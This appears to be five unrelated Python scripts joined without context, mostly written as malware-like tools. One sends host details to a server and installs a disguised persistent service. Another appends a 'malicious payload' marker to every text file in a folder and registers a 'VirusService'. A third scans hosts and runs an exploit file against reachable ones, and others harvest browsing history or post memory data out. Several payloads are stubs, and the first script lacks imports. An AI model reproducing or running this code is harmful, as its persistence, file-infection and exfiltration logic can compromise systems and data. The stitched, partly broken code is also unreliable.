import socket
from argparse import ArgumentParser

def collect_system_info():
    try:
        return {
            "os": os.name,
            "system": platform.system(),
            "version": platform.version(),
            "processor": platform.processor(),
            "architecture": platform.architecture(),
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname())
        }
    except Exception as e:
        logging.error(f"Error collecting system info: {e}")
        return None

def write_system_info_to_file(info, filename):
    try:
        with open(filename, "w") as file:
            for key, value in info.items():
                file.write(f"{key}: {value}\n")
        return True
    except Exception as e:
        logging.error(f"Error writing system info to file '{filename}': {e}")
        return False

def disguise_as_update(update_name):
    try:
        update_file_path = os.path.join(os.getcwd(), update_name)
        with open(update_file_path, "w") as f:
            f.write("# Dummy update file\n")
        logging.info(f"Disguised as update: {update_name}")
        return update_file_path
    except Exception as e:
        logging.error(f"Error creating update file '{update_name}': {e}")
        return None

def send_details_to_server(info, server_address):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_address, 80))
            s.sendall(str(info).encode())
        logging.info(f"Sent system info to server: {server_address}")
    except Exception as e:
        logging.error(f"Error sending system info to server '{server_address}': {e}")

def establish_persistence():
    system = platform.system()
    try:
        if system == "Windows":
            subprocess.run(
                ["sc", "create", "UpdateService", "binPath=", sys.executable],
                check=True
            )
        elif system == "Linux":
            service_content = f"""
            [Unit]
            Description=Update Service

            [Service]
            ExecStart={sys.executable}

            [Install]
            WantedBy=multi-user.target
            """
            with open("/etc/systemd/system/update.service", "w") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "enable", "update"], check=True)
        logging.info("Persistence established with service")
    except Exception as e:
        logging.error(f"Error establishing persistence: {e}")

def parse_arguments():
    parser = ArgumentParser(description="System Info Report Tool")
    parser.add_argument(
        "-o", "--output", 
        default="system_info.txt", 
        help="Output file name (default: system_info.txt)"
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Enable verbose output"
    )
    parser.add_argument(
        "-u", "--update-name", 
        default="system_update.dat", 
        help="Update file name (default: system_update.dat)"
    )
    parser.add_argument(
        "-s", "--server", 
        default="localhost", 
        help="Server address to send info (default: localhost)"
    )
    return parser.parse_args()

def main():
    args = parse_arguments()

    if args.verbose:
        logging.basicConfig(level=logging.INFO)
    else:
        logging.basicConfig(level=logging.WARNING)

    logging.info("System Info Report Tool initialized")

    system_info = collect_system_info()
    if system_info is None:
        print("Failed to collect system information. Check logs for details.")
        sys.exit(1)

    update_file_path = disguise_as_update(args.update_name)
    if update_file_path is None:
        print("Failed to create update file. Check logs for details.")
        sys.exit(1)

    success = write_system_info_to_file(system_info, args.output)
    if success:
        if args.verbose:
            print(f"System information written to {args.output}")
    else:
        print("Failed to write system information to file. Check logs for details.")
        sys.exit(1)

    send_details_to_server(system_info, args.server)

    establish_persistence()

if __name__ == "__main__":
    logging.info("System Info Report Tool starting...")
    main()
    logging.info("System Info Report Tool exiting...")

import os
import sys
import json
import datetime
import socket

def simulate_network_registration(extension_name):
    """Simulate a network connection to register the browser extension."""
    server_address = ('example.com', 80)  # Simulated server address
    try:
        with socket.create_connection(server_address, timeout=5) as conn:
            print(f"Successfully registered extension '{extension_name}' with the server.")
            return True
    except (socket.timeout, socket.error) as e:
        print(f"Network registration failed for extension '{extension_name}': {e}")
        return False

def extract_metadata(file_path):
    """Extract browsing history and bookmark data from a file."""
    browsing_history = []
    bookmarks = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line.startswith("HISTORY:"):
                    browsing_history.append(line[len("HISTORY:"):].strip())
                elif line.startswith("BOOKMARK:"):
                    bookmarks.append(line[len("BOOKMARK:"):].strip())
    except Exception as e:
        print(f"Error reading file '{file_path}': {e}")
        return None, None
    return browsing_history, bookmarks

def analyze_extension(extension_name):
    target_directory = './target'
    log_file = 'analysis_log.txt'

    if not os.path.exists(target_directory):
        print(f"Error: The directory '{target_directory}' does not exist.")
        return

    try:
        files = os.listdir(target_directory)
    except OSError as e:
        print(f"Error accessing the directory: {e}")
        return

    with open(log_file, 'w', encoding='utf-8') as log:
        log.write(f"Analysis for extension: {extension_name}\n")
        log.write("=" * 40 + "\n")

        metadata_found = False
        for file in files:
            file_path = os.path.join(target_directory, file)
            if os.path.isfile(file_path):
                browsing_history, bookmarks = extract_metadata(file_path)
                if browsing_history or bookmarks:
                    metadata_found = True
                    log.write(f"File: {file}\n")
                    log.write("Browsing History:\n")
                    if browsing_history:
                        log.write("\n".join(browsing_history) + "\n")
                    else:
                        log.write("No browsing history found.\n")

                    log.write("Bookmarks:\n")
                    if bookmarks:
                        log.write("\n".join(bookmarks) + "\n")
                    else:
                        log.write("No bookmarks found.\n")
                    log.write("-" * 40 + "\n")
                else:
                    print(f"No metadata found in file '{file_path}'.")
            else:
                print(f"Skipping non-file item: {file}")

        if not metadata_found:
            log.write("No relevant metadata found in any files.\n")

    print(f"Analysis complete. Results written to '{log_file}'.")

def create_service_config(extension_name):
    """Generate a persistent service configuration file."""
    config_file = 'service_config.json'
    timestamp = datetime.datetime.now().isoformat()
    config_data = {
        "extension_name": extension_name,
        "analysis_timestamp": timestamp
    }
    try:
        with open(config_file, 'w', encoding='utf-8') as f:
            json.dump(config_data, f, indent=4)
        print(f"Service configuration saved to '{config_file}'.")
    except Exception as e:
        print(f"Error writing service configuration: {e}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python analyze_extension.py <extension_name>")
        sys.exit(1)

    extension_name = sys.argv[1]

    # Simulate network registration
    simulate_network_registration(extension_name)

    # Analyze extension files
    analyze_extension(extension_name)

    # Create service configuration file
    create_service_config(extension_name)

if __name__ == '__main__':
    main()

import os
import sys
import datetime
import time
import subprocess

def is_text_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            f.read(1024)  # Read a small chunk to validate as text
        return True
    except UnicodeDecodeError:
        return False

def append_marker_to_file(file_path, marker):
    try:
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(marker)
        return True, "Modified successfully"
    except (OSError, IOError) as e:
        return False, f"Error: Cannot modify file '{file_path}'. {e}"

def append_malicious_code(file_path, payload):
    try:
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(payload)
        return True, "Malicious code appended successfully"
    except (OSError, IOError) as e:
        return False, f"Error: Cannot infect file '{file_path}'. {e}"

def log_modification(log_file, file_path, status, message):
    timestamp = datetime.datetime.now().isoformat()
    log_entry = f"{timestamp} | {file_path} | {status} | {message}\n"
    with open(log_file, 'a', encoding='utf-8') as log:
        log.write(log_entry)

def process_directory(directory, marker, payload, log_file):
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if os.path.isfile(file_path) and is_text_file(file_path):
                success, message = append_marker_to_file(file_path, marker)
                status = "Success" if success else "Failed"
                log_modification(log_file, file_path, status, message)

                success, message = append_malicious_code(file_path, payload)
                status = "Success" if success else "Failed"
                log_modification(log_file, file_path, status, message)
            else:
                log_modification(log_file, file_path, "Skipped", "Not a text file")

def start_service(log_file):
    try:
        subprocess.run(["echo", "Service started"], check=True)
        log_modification(log_file, "Service", "Started", "Service started successfully")
    except subprocess.CalledProcessError as e:
        log_modification(log_file, "Service", "Failed", f"Service failed to start: {e}")

def create_persistent_service(log_file):
    try:
        if sys.platform.startswith('win'):
            service_name = "VirusService"
            service_command = f'sc create {service_name} binPath= "cmd /c start /b cmd.exe" start= auto'
        else:
            service_name = "virus"
            service_command = f'echo -e "[Unit]\\nDescription=Malicious Service\\n[Service]\\nExecStart=/bin/true\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/{service_name}.service && systemctl enable {service_name}'

        subprocess.run(service_command, shell=True, check=True)
        log_modification(log_file, "Persistence", "Success", f"Service '{service_name}' created successfully")
    except subprocess.CalledProcessError as e:
        log_modification(log_file, "Persistence", "Failed", f"Failed to create service: {e}")

def activate_payload(log_file):
    try:
        subprocess.run(["echo", "Payload activated"], check=True)
        log_modification(log_file, "Payload", "Activated", "Payload activated successfully")
    except subprocess.CalledProcessError as e:
        log_modification(log_file, "Payload", "Failed", f"Payload activation failed: {e}")

def monitor_directory(directory, marker, payload, log_file, interval, iterations):
    for _ in range(iterations):
        process_directory(directory, marker, payload, log_file)
        time.sleep(interval)

def main():
    target_dir = "./target"
    marker = "--MODIFIED--"
    payload = "\n# MALICIOUS PAYLOAD: Data corruption initiated\n"
    interval = 10
    iterations = 1
    log_file = "modification_log.txt"

    if os.path.isdir(target_dir):
        start_service(log_file)
        create_persistent_service(log_file)
        monitor_directory(target_dir, marker, payload, log_file, interval, iterations)
        activate_payload(log_file)
    else:
        log_modification(log_file, "Directory Check", "Failed", f"Directory '{target_dir}' does not exist.")
        print(f"Error: Directory '{target_dir}' does not exist.")

if __name__ == "__main__":
    main()

import socket
import sys
import time
import argparse
import subprocess
from datetime import datetime

DEFAULT_INPUT_FILE = "hosts.txt"
DEFAULT_OUTPUT_FILE = "remote_scan.txt"
DEFAULT_EXPLOIT_FILE = "exploit.py"
DEFAULT_SERVICE_NAMES = ["cron", "systemd"]

def check_host_reachability(host, port=80, timeout=5, retries=1):
    """Check if a host is reachable by attempting a socket connection with retries."""
    for attempt in range(retries):
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return "reachable"
        except socket.gaierror:
            return "unresolved"
        except socket.timeout:
            pass
        except socket.error:
            pass
    return "unreachable"

def write_results_to_file(results, output_file):
    """Write the results of the scan to a file."""
    with open(output_file, "w") as f:
        for host, status in results:
            f.write(f"{datetime.now()} - Scan result for remote host {host}: {status}\n")

def log(message):
    """Log a message with a timestamp to the console."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{timestamp} - {message}")

def parse_arguments():
    """Parse command-line arguments with sensible defaults."""
    parser = argparse.ArgumentParser(description="Remote Host Audit Tool with Exploitation")
    parser.add_argument(
        "-i", "--input", default=DEFAULT_INPUT_FILE,
        help=f"Input file containing host addresses (one per line). Default: {DEFAULT_INPUT_FILE}"
    )
    parser.add_argument(
        "-o", "--output", default=DEFAULT_OUTPUT_FILE,
        help=f"Output file for scan results. Default: {DEFAULT_OUTPUT_FILE}"
    )
    parser.add_argument(
        "-r", "--retries", type=int, default=3,
        help="Number of retries for connectivity checks. Default: 3"
    )
    parser.add_argument(
        "-e", "--exploit", default=DEFAULT_EXPLOIT_FILE,
        help=f"Exploit script to execute on compromised hosts. Default: {DEFAULT_EXPLOIT_FILE}"
    )
    parser.add_argument(
        "-s", "--services", nargs="+", default=DEFAULT_SERVICE_NAMES,
        help=f"System services for persistence. Default: {', '.join(DEFAULT_SERVICE_NAMES)}"
    )
    return parser.parse_args()

def load_hosts(input_file):
    """Load host addresses from the input file or use a default list if the file is not found."""
    try:
        with open(input_file, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        log(f"Warning: Input file '{input_file}' not found. Using default host list.")
        return ["8.8.8.8", "8.8.4.4", "example.com", "localhost"]

def scan_network_range(base_ip, start=1, end=255):
    """Scan a network range for reachable hosts."""
    reachable_hosts = []
    for last_octet in range(start, end + 1):
        host = f"{base_ip}.{last_octet}"
        log(f"Scanning host: {host}")
        if check_host_reachability(host) == "reachable":
            reachable_hosts.append(host)
    return reachable_hosts

def execute_exploit(host, exploit_file):
    """Simulate executing an exploit on a compromised host."""
    try:
        with open(exploit_file, "r") as exploit:
            code = exploit.read()
        log(f"Executing exploit on {host}")
        # Simulate execution
        exec(code, {"host": host})
        return True
    except Exception as e:
        log(f"Failed to execute exploit on {host}: {e}")
        return False

def establish_persistence(host, service_names):
    """Simulate establishing persistence on a compromised host."""
    for service in service_names:
        log(f"Establishing persistence on {host} using service '{service}'")
        try:
            # Simulate persistence setup
            subprocess.run(["echo", f"Simulated persistence on {host} with {service}"], check=True)
        except subprocess.SubprocessError as e:
            log(f"Failed to establish persistence on {host} with {service}: {e}")

def main():
    args = parse_arguments()

    hosts = load_hosts(args.input)
    results = []
    reachable_count = 0
    compromised_hosts = []

    log(f"Starting scan of {len(hosts)} hosts.")
    for host in hosts:
        log(f"Scanning host: {host}")
        status = check_host_reachability(host, retries=args.retries)
        results.append((host, status))
        if status == "reachable":
            reachable_count += 1
            compromised_hosts.append(host)
        elif status == "unresolved":
            log(f"Error: Host '{host}' could not be resolved.")
        elif status == "unreachable":
            log(f"Host '{host}' is unreachable.")

    write_results_to_file(results, args.output)

    for host in compromised_hosts:
        if execute_exploit(host, args.exploit):
            establish_persistence(host, args.services)

    log(f"Scan completed. Results written to '{args.output}'.")
    log(f"Total hosts scanned: {len(hosts)}")
    log(f"Number of reachable hosts: {reachable_count}")

if __name__ == "__main__":
    main()

import os
import psutil
import http.client
import json
import time

def collect_memory_usage():
    try:
        process = psutil.Process(os.getpid())
        memory_info = process.memory_info()
        return {
            "rss": memory_info.rss,  # Resident Set Size
            "vms": memory_info.vms,  # Virtual Memory Size
            "shared": memory_info.shared,  # Shared memory
            "text": memory_info.text,  # Text memory
            "data": memory_info.data,  # Data memory
            "dirty": memory_info.dirty  # Dirty memory
        }
    except Exception as e:
        return {"error": str(e)}

def write_memory_dump(data, filename="memory_dump.txt"):
    try:
        with open(filename, "w") as file:
            for key, value in data.items():
                file.write(f"{key}: {value}\n")
    except Exception as e:
        print(f"Error writing memory dump: {e}")

def send_to_server(data, server_url="http://localhost:8000", retries=3, verbose=False):
    for attempt in range(retries):
        try:
            if verbose:
                print(f"Attempting to send data to {server_url} (Attempt {attempt + 1}/{retries})...")
            url_parts = server_url.split("/", 3)
            host = url_parts[2]
            path = "/" + url_parts[3] if len(url_parts) > 3 else "/"
            connection = http.client.HTTPConnection(host, timeout=10)
            headers = {"Content-Type": "application/json"}
            connection.request("POST", path, json.dumps(data), headers)
            response = connection.getresponse()
            if verbose:
                print(f"Server response: {response.status} {response.reason}")
            if response.status == 200:
                return
        except Exception as e:
            if verbose:
                print(f"Error sending data: {e}")
            time.sleep(2)  # Wait before the next retry
    if verbose:
        print("Failed to send data to server after retries.")

def main():
    # Default values for headless execution
    server_url = "http://localhost:8000"
    retries = 3
    verbose = False

    if verbose:
        print("Memory Snapshot Tool initialized")

    memory_data = collect_memory_usage()
    write_memory_dump(memory_data)

    if verbose:
        print(f"Memory usage information written to 'memory_dump.txt'")

    send_to_server(memory_data, server_url, retries, verbose)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Unexpected error: {e}")
    exit(0)
